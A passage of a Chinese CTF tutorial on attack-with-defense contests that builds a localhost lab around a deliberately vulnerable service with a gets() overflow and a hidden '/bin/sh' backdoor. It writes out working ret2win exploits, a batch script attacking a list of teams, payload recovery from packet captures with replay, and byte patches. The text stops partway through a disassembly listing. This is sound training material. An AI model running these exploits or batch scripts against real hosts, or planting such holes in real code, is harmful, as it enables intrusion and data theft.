---
chapter: PWN
section: AWD 攻防模式与漏洞修补
order: 321
tags:
  - CTF
  - PWN
  - AWD
publish: true
---

# P21 AWD 攻防模式与漏洞修补
## AWD: Attack with Defense & Patching

> [!info]- 章节信息
> **所属方向**：PWN ｜ **难度阶段**：L4 高级与实战期 ｜ **前置要求**：[[P07-ret2libc-ret2syscall-ret2shellcode|P7]] · [[R08-CrackMe经典题型|R8]]
> **本章目标**：在 AWD 环境中完成"自动利用 + 自动修补"双脚本并保持服务在线。本章本地搭一个 mini-AWD 环境（自编服务程序、socat 挂端口、flag 定时轮换、多队模拟），把攻防两侧各走一遍：攻击侧把手工打通封装成全自动批量 exp，再从流量里还原 payload 重放给其他队；防守侧用等长补丁堵住漏洞与后门，并用脚本守住服务可用性。

## 1. AWD 赛制：与解题赛的本质差异

[[P01-PWN导论与缓解机制全景|P1]] 描述的解题赛是"一题一服务、各队独立、拿 flag 即得分"。AWD（Attack with Defense，攻防对抗）把规则改成了"所有队伍跑同一套服务，互相攻击、各自防守"：

| | 解题赛 | AWD |
| ---- | ---- | ---- |
| 服务归属 | 每题一个主办方服务 | 每队一份==同镜像==的服务实例 |
| 得分方式 | 首杀/完成即得分 | 攻击得分：提交他队服务的 flag；防守得分：自己的服务保持可用、flag 未失守 |
| flag 有效性 | 长期有效 | ==定时轮换==，旧 flag 很快作废 |
| 队伍间关系 | 无 | 直接对抗：你打的每一队也在打你 |
| 核心能力 | 解出题 | ==出题速度内批量利用 + 不改坏服务的前提下修补== |

三条规则决定了 AWD 的打法与前几章完全不同：

- **同镜像**：所有队伍拿到的服务程序一模一样。你本地调通的 exploit，偏移、地址、payload 对任何一队都成立——利用只做一次，剩下的工作是"分发给全列表"。
- **攻击与防守同时进行**：你修补自己服务的时间，也是别人能打你的时间。多数赛事开赛后留一段纯防守窗口（十几到几十分钟，以赛事规程为准），这段时间的修补质量决定第一轮轮换前你丢多少分。
- **服务可用性直接决定防守得分**：平台按固定周期探测每队服务是否存活、功能是否正常。==把服务 patch 坏，等于不战而降==——这是 AWD 防守一切动作的前提约束。

于是 AWD 的技术栈分成两半：攻击半边是[[P07-ret2libc-ret2syscall-ret2shellcode|P7]] 以来的利用基本功加上工程化（封装、批量、提交）；防守半边是 [[R08-CrackMe经典题型|R8]] 的 patch 技术加上一条新约束（服务必须活着）。本章把两半各走一遍，使用的环境全部自己搭建，每个脚本都能照抄复现。

## 2. 搭一个 mini-AWD 环境

真实 AWD 的环境由主办方提供：裁判机、每队一个容器、flag 轮换服务。把它的三个核心部件在自己机器上复刻出来，就得到一个可以随意实验的 mini-AWD：一个带漏洞的服务程序、socat 挂端口、一个 flag 轮换脚本。本节全部内容在本机 Linux（WSL 中的 Ubuntu）上完成。

### 2.1 目标服务程序

服务程序模拟真实 AWD 服务常见的三个要素：一个正常功能、一个开发遗留的调试通道（漏洞点）、一个偷懒留下的后门：

```c
/* awd_srv.c —— mini-AWD 的目标服务（x86-64 Linux）
   对外三个行为：
   1. name> 有界读入并问候 —— 正常功能，可用性检查的对象
   2. debug> 无界读入（gets） —— 遗留调试代码，栈溢出漏洞所在
   3. name 等于魔串时 system("/bin/sh") —— 开发遗留后门
   win() 读 flag.txt 打印 —— 攻击的最终目标 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char *gets(char *s);   /* gets 已移出 C11 标准，新版头文件不再声明，手动补 */

void win(void) {
    char flag[64];
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        puts("[win] flag.txt not found");
        return;
    }
    fgets(flag, sizeof(flag), f);
    puts(flag);
    fclose(f);
}

void debug(void) {
    char buf[32];
    printf("debug> ");
    gets(buf);                 /* 漏洞点：无界读入 */
    puts("[debug] done");
}

int main(void) {
    char name[32];
    setbuf(stdout, NULL);

    puts("AWD storage v1");
    printf("name> ");
    fgets(name, sizeof(name), stdin);        /* 正常功能：有界读入 */
    name[strcspn(name, "\n")] = '\0';        /* 去掉行尾换行 */

    if (strcmp(name, "b4ckd00r_pls") == 0) {
        system("/bin/sh");                   /* 后门：任何人都该能看出这是事故 */
    }

    printf("hello, %s\n", name);
    debug();
    puts("bye");
    return 0;
}
```

三个要素各自对应本章后面的一类动作：`debug()` 里的 `gets` 是攻击半边的主漏洞（栈溢出，[[P06-栈溢出原理与ret2win|P6]] 的全套方法直接适用）；`strcmp` 后门是"不用利用就能拿 flag 的捷径"，也是防守半边补丁 B 的对象；`name` 问候是有界读入的正常功能，它必须始终正常——可用性检查就查它。真实赛题的漏洞形态不止栈溢出，格式化字符串（[[P09-格式化字符串漏洞|P9]]）、堆利用（[[P13-基础堆漏洞|P13]]）同样常见，但"利用 → 封装 → 批量"的工程流程完全一致。

按 AWD 服务的常见配置编译——关掉 PIE 与 Canary，让栈题的地址都是常量：

```bash
gcc -O0 -fno-pie -no-pie -fno-stack-protector awd_srv.c -o awd_srv
```

输出：

```
/usr/bin/x86_64-linux-gnu-ld.bfd: /tmp/ccvtlFmP.o: in function `debug':
awd_srv.c:(.text+0x84): warning: the `gets' function is dangerous and should not be used.
```

警告不是错误，产物照常生成。checksec 判读（工具细节 [[P05-pwntools与GDB插件工具链|P5]]）：

```bash
pwn checksec ./awd_srv
```

输出：

```
[*] '/home/awd/p20/awd_srv'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

No canary：覆盖可以直达返回地址；No PIE：函数地址写进 payload 就能用。两个关键函数的地址：

```bash
nm awd_srv | grep -E ' T (main|win|debug)$'
```

输出：

```
00000000004012b7 T debug
00000000004012eb T main
0000000000401256 T win
```

反汇编 `debug`，读出偏移与漏洞点（x86-64 Linux / System V AMD64 ABI）：

```bash
objdump -d -M intel awd_srv | sed -n '/<debug>:/,/^$/p'
```

输出：

```asm
00000000004012b7 <debug>:
  4012b7:	f3 0f 1e fa          	endbr64
  4012bb:	55                   	push   rbp
  4012bc:	48 89 e5             	mov    rbp,rsp
  4012bf:	48 83 ec 20          	sub    rsp,0x20
  4012c3:	bf 28 20 40 00       	mov    edi,0x402028          ; "debug> "
  4012c8:	b8 00 00 00 00       	mov    eax,0x0
  4012cd:	e8 3e fe ff ff       	call   401110 <printf@plt>
  4012d2:	48 8d 45 e0          	lea    rax,[rbp-0x20]       ; buf 在 rbp-0x20
  4012d6:	48 89 c7             	mov    rdi,rax
  4012d9:	e8 72 fe ff ff       	call   401150 <gets@plt>     ; 漏洞点
  4012de:	bf 30 20 40 00       	mov    edi,0x402030          ; "[debug] done"
  4012e3:	e8 e8 fd ff ff       	call   4010d0 <puts@plt>
  4012e8:	90                   	nop
  4012e9:	c9                   	leave
  4012ea:	c3                   	ret                          ; 控制执行流的入口
```

`buf` 在 `rbp-0x20` 占 32 字节，加上 8 字节 saved rbp，偏移 = 40。量法就是 [[P06-栈溢出原理与ret2win#2. 算偏移的两种方法|P6 第 2 节]]的 cyclic/标记法，同布局同答案，这里直接用结论。`main` 里的后门与正常功能（节选）：

```bash
objdump -d -M intel awd_srv | sed -n '/<main>:/,/^$/p'
```

输出（节选，自 name 读入起）：

```asm
; x86-64 Linux / System V AMD64 ABI
  401324:	48 8b 15 45 2d 00 00 	mov    rdx,QWORD PTR [rip+0x2d45]        # 404070 <stdin@GLIBC_2.2.5>
  40132b:	48 8d 45 e0          	lea    rax,[rbp-0x20]
  40132f:	be 20 00 00 00       	mov    esi,0x20
  401334:	48 89 c7             	mov    rdi,rax
  401337:	e8 f4 fd ff ff       	call   401130 <fgets@plt>    ; 正常功能：有界读入
  40133c:	48 8d 45 e0          	lea    rax,[rbp-0x20]
  401340:	be 53 20 40 00       	mov    esi,0x402053
  401345:	48 89 c7             	mov    rdi,rax
  401348:	e8 d3 fd ff ff       	call   401120 <strcspn@plt>  ; 去掉行尾换行
  40134d:	c6 44 05 e0 00       	mov    BYTE PTR [rbp+rax*1-0x20],0x0
  401352:	48 8d 45 e0          	lea    rax,[rbp-0x20]
  401356:	be 55 20 40 00       	mov    esi,0x402055          ; 魔串 "b4ckd00r_pls"
  40135b:	48 89 c7             	mov    rdi,rax
  40135e:	e8 dd fd ff ff       	call   401140 <strcmp@plt>
  401363:	85 c0                	test   eax,eax
  401365:	75 0a                	jne    401371 <main+0x86>    ; 不等 → 跳过后门
  401367:	bf 62 20 40 00       	mov    edi,0x402062          ; "/bin/sh"
  40136c:	e8 8f fd ff ff       	call   401100 <system@plt>   ; 后门
  401371:	48 8d 45 e0          	lea    rax,[rbp-0x20]
  ……（hello 输出与 debug 调用，省略）……
```

这两人反汇编就是全章的地基：攻击侧要的是 40 这个偏移与 `win` 的地址；防守侧要的是 4012d9（`call gets@plt`）与 401363–401365（`test`/`jne`）这两处补丁点的字节。

> [!info]- 真实 AWD 的服务没有源码
> 本章为了能看着源码讲清楚，自己写了服务。真实 AWD 开局拿到的是二进制（可能还剥了符号），漏洞定位靠 [[R05-静态分析工具链IDA与Ghidra|R05]] 的静态分析加 nc 交互摸协议：先连上去把每一步提示与输入的对应关系记下来（这就是 2.2 要做的），再进反编译器找危险函数与可疑比较。协议摸不清，后面的自动化脚本就无从写起。

### 2.2 socat：把程序挂成网络服务

PWN 题的远程服务几乎都是 socat 挂出来的：监听端口，每来一个连接就 fork 一个新进程，把 socket 接到它的 stdin/stdout：

```bash
socat TCP-LISTEN:9001,reuseaddr,fork EXEC:./awd_srv
```

三个选项各管一件事：`reuseaddr` 让重启服务不必等 TIME_WAIT 散去；`fork` 让每个连接独立一个进程——==一个连接被打崩不影响下一个连接==，这正是 AWD 服务的容错要求；`EXEC` 启动的程序从 socket 收发数据，就像 `nc host port` 连进了一个交互式会话。==`EXEC:./awd_srv` 里的相对路径按 socat 启动时的目录解析==，fork 出的进程继承这个目录作为 cwd——`win()` 按 cwd 找 `flag.txt`，所以 socat 必须在队伍目录里启动（第 7 节有一个专门由它引起的事故）。

连通检查：连上端口，把正常功能走一遍（`printf` 一次给两行输入，`nc` 收到的字节按到达顺序显示）：

```bash
printf 'guest\nping\n' | timeout 3 nc 127.0.0.1 9001
```

输出：

```
AWD storage v1
name> hello, guest
debug> [debug] done
bye
```

三段提示符（`name> `、`debug> `）与三段输出（问候、done、bye）一一对应——==这就是服务的通信协议==，后面所有脚本按它对齐收发。

### 2.3 多队、flag 轮换与整套启动脚本

AWD 里每队一份服务实例。本机模拟两队：每队一个目录，里面放同一份二进制和各自的 flag 文件：

```bash
mkdir -p teamA teamB
cp awd_srv teamA/ && cp awd_srv teamB/
echo 'flag{awd_teamA_1001}' > teamA/flag.txt
echo 'flag{awd_teamB_2002}' > teamB/flag.txt
```

目录布局：

```text
p20/
├── awd_srv          # 原始镜像（分发源）
├── awd_srv.c
├── start_awd.sh     # 整套启动脚本
├── rotate_flag.sh   # flag 轮换脚本
├── check_srv.py     # 服务可用性检查（第 5 节）
├── exp_auto.py / exp_batch.py / exp_replay.py   # 攻击脚本（第 3、4 节）
├── submit_flag.py   # 提交骨架（第 6 节）
├── teamA/
│   ├── awd_srv      # 本队运行的副本（第 5 节会被 patch）
│   └── flag.txt
└── teamB/
    ├── awd_srv
    └── flag.txt
```

flag 轮换脚本：周期性地给每队写入新 flag，模拟主办方裁判机的定时轮换：

```bash
#!/bin/bash
# rotate_flag.sh —— 定时给每支队伍换 flag（AWD 赛制的 flag 轮换）
# 用法：rotate_flag.sh <间隔秒> <队伍目录>...
# 队伍目录里必须已有 flag.txt；轮换只改内容，路径不变
interval=$1; shift
while true; do
    for d in "$@"; do
        echo "flag{awd_${d##*/}_$RANDOM$RANDOM}" > "$d/flag.txt" || echo "写入 $d/flag.txt 失败" >&2
    done
    sleep "$interval"
done
```

轮换只改内容不改路径——`win()` 每次连接重新 `fopen`，天然读到当前值，服务侧不需要任何配合。整套启动脚本把两队一起拉起：

```bash
#!/bin/bash
# start_awd.sh —— 启动 mini-AWD：每队一个目录、一个端口、一份同镜像服务
# 用法：start_awd.sh            # 约定 teamA=9001 teamB=9002
# 停止：pkill -x awd_srv; pkill -x socat
cd "$(dirname "$0")" || exit 1
port=9000
for d in teamA teamB; do
    port=$((port + 1))
    if [ ! -x "$d/awd_srv" ]; then
        echo "缺少 $d/awd_srv，先编译并分发" >&2
        exit 1
    fi
    [ -f "$d/flag.txt" ] || echo 'flag{awd_init}' > "$d/flag.txt"
    ( cd "$d" && nohup socat TCP-LISTEN:$port,reuseaddr,fork EXEC:./awd_srv >/dev/null 2>&1 & )
    echo "$d -> 127.0.0.1:$port"
done
```

两个细节值得读：`cd "$(dirname "$0")"` 把工作目录锚到脚本所在处，==socat 在各队自己的目录里启动==，cwd 与 flag 文件绑定；子 shell 加 `nohup ... &` 让 socat 脱离会话后台常驻。启动并确认监听：

```bash
bash start_awd.sh && sleep 1 && ss -tlnp | grep -E ':(9001|9002)'
```

输出：

```
teamA -> 127.0.0.1:9001
teamB -> 127.0.0.1:9002
LISTEN 0      5             0.0.0.0:9001      0.0.0.0:*    users:(("socat",pid=13807,fd=5))
LISTEN 0      5             0.0.0.0:9002      0.0.0.0:*    users:(("socat",pid=13809,fd=5))
```

mini-AWD 搭建完成：两个端口、两个队、各自的 flag。之后每节都是在这个环境上做动作。

> [!info]- 裁判机还管什么
> 真实赛事的裁判机除了轮换 flag，还承担计分与探测：周期性向每队服务发一轮正常请求，按响应判定"服务存活"并计防守分；接收各队提交的 flag，校验是否为当前轮的他队 flag。本章的 check_srv.py（5.5）就是自建版探测，submit_flag.py（第 6 节）就是自建版提交接口。把这两块合起来配一个 Web 界面，就是一个可用的 AWD 训练平台，GitHub 上搜 awd platform / awd judge 能找到若干现成开源实现。

## 3. 攻击侧：从手工打通到全自动批量

AWD 攻击的工作量分布是"一次打通，处处打通"：利用只调一次，之后是封装、批量、提交。本节按这个顺序走：先手工打穿 9002（teamB），确认偏移与地址；再封装成全自动脚本；最后把队列表跑成批量。

### 3.1 手工打通

手工阶段先走两条路：近道（后门）与正路（栈溢出）。近道先确认服务确实有后门——输入魔串，shell 会从同一个 socket 读后续命令：

```bash
{ printf 'b4ckd00r_pls\n'; sleep 1; printf 'cat flag.txt\nexit\n'; } | timeout 6 nc 127.0.0.1 9002
```

输出：

```
AWD storage v1
name> flag{awd_teamB_2002}
hello, b4ckd00r_pls
debug> 
```

`flag{awd_teamB_2002}` 就是 teamB 当前的 flag。==输入必须分两拍发==：`sleep 1` 之前的魔串被 `fgets` 读走，之后的命令留给后门 shell。若一次全部发给管道，`fgets` 底层的 stdio 读会把此刻已在管道里的字节一并取进缓冲，后门 shell 再去读 socket 时已经什么都没有——[[P07-ret2libc-ret2syscall-ret2shellcode#2.4 拼链与 getshell|P7 2.4]] 的缓冲吞命令警告在 AWD 的交互里同样应验。命令里那层 `timeout` 也有用途：程序随后停在 `debug>` 等输入，没有 timeout 的 nc 会一直挂着。

正路是 [[P06-栈溢出原理与ret2win|P6]] 的 ret2win：先应答 `name>` 保持会话前进，再往 `debug>` 发溢出 payload，把 `debug` 的返回地址换成 `win`（0x401256）。payload 生成器：

```python
import sys
# gen_win.py —— 手工 ret2win 的 payload：40 字节填充 + 小端 win 地址（0x401256）
sys.stdout.buffer.write(b'A' * 40 + (0x401256).to_bytes(8, 'little') + b'\n')
```

```bash
{ printf 'guest\n'; python3 gen_win.py; } | timeout 6 nc 127.0.0.1 9002
```

输出：

```
AWD storage v1
name> hello, guest
debug> [debug] done
flag{awd_teamB_2002}

```

flag 打出来了（末尾的空行来自 `win` 里 `fgets` 保留的换行加 `puts` 自带换行，两个 `\n` 叠出一行空白）。有一行输出值得停下来读：==`[debug] done` 出现在 flag 之前==。溢出发生在 `call gets@plt`，但控制流不会当场转向——gets 返回后函数照常执行到尾声，把 `[debug] done` 打完，`leave; ret` 才把被覆盖的返回地址弹进 rip 跳进 `win`。==覆盖内存与转移控制流是两个时刻，中间的指令照跑==；读 AWD 服务的输出时按这个顺序对时间线，才不会误判 payload 没生效。

> [!note] 近道与正路都要走一遍
> 后门是"零成本拿 flag"的捷径，栈溢出是"服务修补前永远可用的正路"。两者都打通再封装，批量阶段才知道哪条路能对抗对方修补：后门可能被堵（5.3），溢出可能被 nop（5.2），==两个向量都封死的队才是真打不动的队==。

### 3.2 全自动 exploit

手工流程的每一步都是确定的：连接、等 `name>`、答一句、等 `debug>`、发 payload、收 flag。把它翻成 pwntools 脚本（收发函数与 remote 用法 [[P05-pwntools与GDB插件工具链#3. 连接与输入输出：process、remote 与一套收发函数|P5 第 3 节]]）：

```python
#!/usr/bin/env python3
# exp_auto.py —— 全自动 exploit：连接 → 应答正常功能 → 溢出 → 读 flag → 格式化输出
from pwn import *
import re

context.arch = 'amd64'
context.log_level = 'error'

FLAG_RE = re.compile(rb'flag\{[^}\s]+\}')

def pwn_one(host, port, offset=40, win=0x401256):
    io = remote(host, port, timeout=5)
    io.recvuntil(b'name> ')
    io.sendline(b'guest')                      # 正常功能照常应答，保持会话前进
    io.recvuntil(b'debug> ')
    io.sendline(b'A' * offset + p64(win))      # P6/P7 基本功：ret2win
    data = io.recvall(timeout=3)
    io.close()
    m = FLAG_RE.search(data)
    return m.group().decode() if m else None

if __name__ == '__main__':
    import sys
    host = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 9002
    try:
        flag = pwn_one(host, port)
    except Exception as e:
        print('[-] %s:%d 打不动: %s' % (host, port, e))
        sys.exit(1)
    if flag:
        print('[+] %s:%d -> %s' % (host, port, flag))
    else:
        print('[-] %s:%d 未拿到 flag（目标可能已修补或服务异常）' % (host, port))
```

四个工程化决策，每个都对应批量阶段会撞上的坑：

- **`recvuntil` 对齐提示符**：不数延时，等标记再发。标记与服务实际输出不一致是自动脚本 EOF 的头号原因——先像 2.2 那样用 nc 把协议走一遍再写脚本。
- **收尾用 `recvall(timeout=3)`**：ret2win 之后服务大概率崩溃断连（`win` 自己的 ret 弹到垃圾数据），与其逐行猜输出，不如"收到 EOF 或超时为止"一次收全，再交给正则挑 flag。
- **flag 用正则提取**，不按行解析：输出里混着问候语与 done 行，`flag\{[^}\s]+\` 直接把目标挑出来。
- **连接级 `timeout` + 异常单独捕获**：一队服务挂了不能拖垮整个循环。

跑一遍：

```bash
python3 exp_auto.py 127.0.0.1 9002
```

输出：

```
[+] 127.0.0.1:9002 -> flag{awd_teamB_2002}
```

> [!info]- 利用目标的选择：不必次次 getshell
> ret2win 直接读 flag，一步到位。若服务没有 win 这类直达路径，就退回 [[P07-ret2libc-ret2syscall-ret2shellcode|P7]] 的 getshell 路线，shell 起来后 `cat flag.txt` 一发就退——AWD 交互要的是 flag，不是驻留。极端场景（服务开 seccomp 只留 open/read/write）用 ORW 收尾，工具与链形见 [[P07-ret2libc-ret2syscall-ret2shellcode#6. seccomp 沙箱与 ORW：execve 被禁之后|P7 第 6 节]]，转栈手段见 [[P16-FSOP与HouseofApple2#6. setcontext+0x35：一次调用换一整套寄存器|P16 第 6 节]]。自动化脚本里的对应原则：==每一步交互都为"取出当前轮 flag"服务，多余动作都是给对方流量分析送材料==（第 4 节马上会看到为什么）。

### 3.3 批量打多队

同镜像意味着同一份 payload 对所有队成立，把单点脚本套上队列表循环就是批量工具：

```python
#!/usr/bin/env python3
# exp_batch.py —— 队列表循环：一份 exp 批量打多队
from pwn import *
import re

context.arch = 'amd64'
context.log_level = 'error'

FLAG_RE = re.compile(rb'flag\{[^}\s]+\}')

OFFSET = 40            # P6 第 2 节量出的偏移，同镜像下各队一致
WIN    = 0x401256      # nm awd_srv | grep ' T win'

TEAMS = [
    ('127.0.0.1', 9001, 'teamA'),
    ('127.0.0.1', 9002, 'teamB'),
    # ('10.10.x.y', 9999, 'teamC'),   # 真实赛场：队列表来自平台接口或扫段
]

def pwn_one(host, port):
    io = remote(host, port, timeout=5)
    io.recvuntil(b'name> ')
    io.sendline(b'guest')
    io.recvuntil(b'debug> ')
    io.sendline(b'A' * OFFSET + p64(WIN))
    data = io.recvall(timeout=3)
    io.close()
    m = FLAG_RE.search(data)
    return m.group().decode() if m else None

for host, port, name in TEAMS:
    try:
        flag = pwn_one(host, port)
    except Exception as e:
        print('[-] %s(%s:%d) 打不动: %s' % (name, host, port, e))
        continue
    if flag:
        print('[+] %s(%s:%d) -> %s' % (name, host, port, flag))
    else:
        print('[-] %s(%s:%d) 无 flag，目标可能已修补' % (name, host, port))
```

```bash
python3 exp_batch.py
```

输出：

```
[+] teamA(127.0.0.1:9001) -> flag{awd_teamA_1001}
[+] teamB(127.0.0.1:9002) -> flag{awd_teamB_2002}
```

两队的 flag 一次拿全。循环体里三个纪律在真实赛场是刚需：每队一个 `timeout`（对方服务挂起不能拖住自己的循环）；单队异常只记日志不中断（`continue`）；无 flag 单独归类（"打不动"与"出错"是两种信息——前者通常意味着对方修补了，见 5.5）。真实赛场的队列表来源放折叠框。

> [!info]- 队列表从哪来
> 三种常见来源：主办方平台有接口或页面列出各队服务的 IP 与端口，写个拉取脚本生成 TEAMS；没有列表就对自己的网段做端口扫描（服务端口通常统一，如各队都是 9999），扫到的就是活着的队；还有一种"躺着来"的——对方打进你的服务时，你的日志与流量里会出现对方 payload（第 4 节的反向运用）。批量打完后立刻进入提交流程（第 6 节），==flag 的有效窗口以轮换周期为上限，打完不提交等于没打==。

## 4. 流量分析：还原并重放别人的 payload

AWD 的经典战术：抓下攻击队的流量，还原出他的 exp 逻辑，原样重放给其他还没修补的队——==别人的调试成果直接变成你的攻击武器==。本节在本机把这条链完整走一遍，自己扮演"被抄的那个队"。

### 4.1 抓包

tcpdump 在回环接口上抓攻击流量的原始字节，写成 pcap 文件（装包用免密 root：`apt-get install -y tcpdump`）：

```bash
tcpdump -i any -w awd.pcap -U tcp port 9002 &
# 另开终端跑 python3 exp_auto.py 127.0.0.1 9002，跑完后 kill %1 结束抓包
```

> [!note] 抓回环流量的接口选择
> 常规 Linux 上回环流量走 `lo` 接口，命令写作 `tcpdump -i lo ...`。本章演示环境是 WSL 的镜像网络模式，`127.0.0.1` 的连接由网络栈特殊处理、不落在 `lo` 上，抓包要用 `-i any` 才收得到——下面读 pcap 的输出里接口名显示为 `loopback0` 也是同一原因。两边抓到的 IP/TCP 层字节完全一致，不影响 4.2 的还原。

抓包期间跑一次 3.2 的 exp_auto，pcap 里就是这次攻击的完整字节流。

### 4.2 从 hex dump 还原 payload

`-X` 按"十六进制 + ASCII"打印每个包。攻击方的数据包带着 PSH 标志且载荷非空，按 `length 49` 定位（49 = 40 字节填充 + 8 字节地址 + 1 字节换行）：

```bash
tcpdump -nr awd.pcap -X -s0 | grep -A9 'length 49'
```

输出（节选，Out 与 In 是镜像网络对同一包的两份记录，看 Out 那份即可）：

```
11:02:19.794721 loopback0 Out IP 127.0.0.1.45890 > 127.0.0.1.9002: Flags [P.], seq 7:56, ack 42, win 63, options [nop,nop,TS val 4146162497 ecr 787523520], length 49
	0x0000:  4500 0065 8a8b 4000 4006 b205 7f00 0001  E..e..@.@.......
	0x0010:  7f00 0001 b342 232a 0304 174f 7e5e d7d0  .....B#*...O~^..
	0x0020:  8018 003f fe59 0000 0101 080a f721 6b41  ...?.Y.......!kA
	0x0030:  2ef0 a7c0 4141 4141 4141 4141 4141 4141  ....AAAAAAAAAAAA
	0x0040:  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
	0x0050:  4141 4141 4141 4141 4141 4141 5612 4000  AAAAAAAAAAAAV.@.
	0x0060:  0000 0000 0a                             .....
```

还原只需两层换算。第一层，定位载荷起点：`-X` 从 IP 头开始打印，IP 头 20 字节（0x0000–0x0013）；TCP 头的基本 20 字节加 12 字节时间戳选项（首字节 `8` 的高半字节即数据偏移 8，表示 32 字节头），共 32 字节（0x0014–0x0033）。==载荷从 0x0034 开始==。

第二层，逐段读载荷：

| 字节范围 | 内容 | 读出的信息 |
| ---- | ---- | ---- |
| 0x0034–0x005b | 40 个 `41`（ASCII `A`） | 填充 40 字节 → ==对方量出的偏移是 40== |
| 0x005c–0x0063 | `56 12 40 00 00 00 00 00` | 8 字节小端地址（[[R02-C语言与内存模型回顾#7. 大小端\|R02 第 7 节]]），还原为 ==0x401256== |
| 0x0064 | `0a` | 换行符：对方走的是 gets 一族的行输入 |

三个数字拼出对方的完整 exp 逻辑：==往第 41 字节起写小端 0x401256 的 ret2win==。佐证还有两处：摘要行 `seq 7:56` 说明这是该连接的第二段数据——第一段 `guest\n` 占 6 字节（相对序号 1–6），本段从序号 7 起、共 49 字节，"先应答正常功能再发 payload"的交互顺序也一并还原了。地址 0x401256 在同镜像下对所有队通用——这正是同镜像赛制的另一面：==payload 没有队伍特异性，抄来就能用==。

> [!info]- 载荷比这次的长怎么办
> 真实流量里的 payload 可能是一长条 ROP 链（[[P07-ret2libc-ret2syscall-ret2shellcode|P7]]）、一堆格式化字符串偏移（[[P09-格式化字符串漏洞|P9]]）甚至分多包发送。还原方法不变：载荷起点照 4.2 算，内容按 8 字节一组切槽位，地址段（形如 `xx xx 40 00 …` 的非 PIE 程序地址）认出来，其余按 gadget 链解读；跨包时按 TCP 序号拼回完整流（`tcpdump -r awd.pcap -A` 直接给 ASCII 也有辅助价值）。还原出的逻辑不必逐字节照抄——==看懂结构后，用自己的脚本重写一遍更稳==，还能顺手修掉对方 payload 里的坏字符依赖。

### 4.3 重放：打其他队

把还原出的字节装进脚本，目标换成队列表里的其他队（这里是还没修补的 9001）：

```python
#!/usr/bin/env python3
# exp_replay.py —— 抄作业：把从流量里还原的 payload 原样重放给另一支队伍
# payload 来源：tcpdump -X 抓包 0x0034 起的 49 字节
# 41*40（填充）+ 56 12 40 00 00 00 00 00（小端 0x401256）+ 0a（换行）
from pwn import *
import re

context.log_level = 'error'

PAYLOAD = bytes.fromhex('41' * 40 + '5612400000000000')   # 换行交给 sendline 补

io = remote('127.0.0.1', 9001, timeout=5)
io.recvuntil(b'name> ')
io.sendline(b'guest')
io.recvuntil(b'debug> ')
io.sendline(PAYLOAD)
data = io.recvall(timeout=3)
io.close()

m = re.search(rb'flag\{[^}\s]+\}', data)
print('[+] 重放命中，拿到 teamA 的 flag: %s' % (m.group().decode() if m else '无'))
```

```bash
python3 exp_replay.py
```

输出：

```
[+] 重放命中，拿到 teamA 的 flag: flag{awd_teamA_1001}
```

从抓包到重放，全程没有接触过对方的 exp 源码。这招的另一半是防御视角：==你的每一次攻击同样躺在别人的抓包里==。应对思路在第 7 节展开。

## 5. 防守侧：不改源码的等长补丁

AWD 防守的处境：拿到的是编译好的二进制，没有源码、没有重新编译的条件（也不该有——编译环境与镜像不一致本身就是风险），修补只能在二进制上做字节级手术。手术刀法与 [[R08-CrackMe经典题型#5. 类型四：patch 绕过型|R8 第 5 节]]同源，但多了一条 AWD 特有的硬约束：==patch 之后服务必须继续正常工作==。

### 5.1 动手前的三件事

- **备份原版**：`cp awd_srv awd_srv.orig`。补丁打坏了要能一键回滚，回滚速度就是防守分。
- **复习三铁律**：等长、先副本、量准文件偏移——[[R08-CrackMe经典题型#5.5 补丁规范|R8 5.5]] 逐条讲过，本章照用。非 PIE 下虚拟地址减 0x400000 即文件偏移，用 `objdump -h` 的 `.text` 行核对：

```bash
objdump -h awd_srv | grep ' \.text'
```

输出：

```
 12 .text         0000022d  0000000000401170  0000000000401170  00001170  2**4
```

`.text` 的虚拟地址 0x401170 对应文件偏移 0x1170——差值正是 0x400000，与铁律一致。

- **列出全部攻击面**：按 2.1 的反汇编，本服务有两个向量——`debug()` 的 `gets` 溢出（主漏洞）与 `main` 里的魔串后门（捷径）。修补清单把两个都覆盖，只堵一个等于没堵。

### 5.2 补丁 A：nop 掉危险调用

补丁点：0x4012d9 的 `call gets@plt`，5 字节 `e8 72 fe ff ff`。处理方式是全部换成 `nop`（0x90）：调用被拆除，`buf` 不再被写入，溢出从源头消失；`debug()` 的其余部分照跑——提示符照打、`[debug] done` 照出，==服务功能不受影响==。

替换前先确认这个字节模式在全文件里唯一——sed 是全文替换，模式撞到别处会把无辜指令劈断：

```bash
xxd -p awd_srv | tr -d '\n' | grep -o 'e872feffff' | wc -l
```

输出：

```
1
```

唯一，可以动手。按"先副本"的规矩在副本上改（`xxd` 整文件转储成 hex 文本，`sed` 换字节，`xxd -r` 转回二进制）：

```bash
cd teamA
cp awd_srv awd_fixed
xxd -g1 awd_fixed > fix.hex
sed -i 's/e8 72 fe ff ff/90 90 90 90 90/; s/75 0a/eb 0a/' fix.hex
xxd -r fix.hex > awd_fixed
cmp -l awd_srv awd_fixed
```

输出：

```
 4826 350 220
 4827 162 220
 4828 376 220
 4829 377 220
 4830 377 220
 4966 165 353
```

`cmp -l` 按字节列出差异：第一列是 1 起算的文件偏移（八进制环境显示为十进制序号），后两列是两份文件该字节的八进制值。六行恰好对应两个补丁点：4826–4830（文件偏移 0x12d9 起，即 0x4012d9 − 0x400000）的 5 个字节全变成 220（八进制）= 0x90；4966（0x1365，即 0x401365）那 1 个字节 165（八进制）= 0x75 变成了 353（八进制）= 0xeb——==这一行是补丁 B 的==，下一小节讲。改动范围与预期完全一致，没有波及无辜字节。

复查补丁点反汇编（对比 2.1 的原始版本）：

```bash
objdump -d -M intel awd_fixed | sed -n '/<debug>:/,/^$/p'
```

输出：

```asm
; x86-64 Linux / System V AMD64 ABI
00000000004012b7 <debug>:
  4012b7:	f3 0f 1e fa          	endbr64
  4012bb:	55                   	push   rbp
  4012bc:	48 89 e5             	mov    rbp,rsp
  4012bf:	48 83 ec 20          	sub    rsp,0x20
  4012c3:	bf 28 20 40 00       	mov    edi,0x402028
  4012c8:	b8 00 00 00 00       	mov    eax,0x0
  4012cd:	e8 3e fe ff ff       	call   401110 <printf@plt>
  4012d2:	48 8d 45 e0          	lea    rax,[rbp-0x20]
